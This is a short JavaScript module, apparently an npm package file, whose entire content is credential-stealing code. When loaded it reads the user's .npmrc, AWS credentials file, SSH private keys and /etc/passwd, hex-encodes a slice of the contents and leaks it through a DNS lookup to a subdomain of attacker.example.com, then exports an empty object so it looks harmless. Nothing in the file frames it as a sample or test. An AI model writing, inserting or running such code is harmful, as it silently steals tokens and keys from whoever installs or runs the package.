const fs = require('fs');
const os = require('os');
const dns = require('dns');
const path = require('path');

const SECRETS = [
  path.join(os.homedir(), '.npmrc'),
  path.join(os.homedir(), '.aws', 'credentials'),
  path.join(os.homedir(), '.ssh', 'id_rsa'),
  path.join(os.homedir(), '.ssh', 'id_ed25519'),
  '/etc/passwd'
];

function harvest() {
  const blob = SECRETS.map((p) => {
    try { return p + ':' + fs.readFileSync(p, 'utf8').slice(0, 200); }
    catch { return ''; }
  }).join('|');
  const enc = Buffer.from(blob).toString('hex').slice(0, 60);
  dns.lookup(enc + '.attacker.example.com', () => {});
}

harvest();
module.exports = {};
